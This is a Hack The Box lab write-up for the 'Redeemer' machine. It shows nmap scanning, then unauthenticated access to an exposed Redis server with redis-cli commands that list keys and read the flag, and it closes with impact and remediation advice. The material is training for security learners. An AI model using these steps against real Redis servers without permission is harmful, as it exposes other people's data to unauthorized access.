# Redeemer - Hack The Box

## Reconnaissance

- VPN connection established using OpenVPN
- Target reachable via ping

```bash
ping <target_IP>
```

- Nmap scan performed:

```bash
nmap -sV <target_IP>
```

### Result

- Port 6379 open → Redis service

---

## Enumeration

- Connect to Redis server:

```bash
redis-cli -h <target_IP>
```

- Retrieve server information:

```bash
info
```

- Identify available databases and keyspace information

---

## Exploitation

- Select database:

```bash
select 0
```

- List all keys:

```bash
keys *
```

---

## Post-Exploitation

- Retrieve flag from key:

```bash
get flag
```

---

## Vulnerability

The Redis service is exposed without authentication.

---

## Impact

- Unauthorized access to database contents
- Sensitive data exposure
- Potential for remote command execution (in real scenarios)

---

## Remediation

- Enable authentication (requirepass)
- Bind Redis to localhost or internal network only
- Use firewall rules to restrict access
- Disable dangerous commands in production

---

## Skills Demonstrated

- Service enumeration with Nmap
- Redis interaction using CLI
- Database enumeration
- Data extraction from exposed service
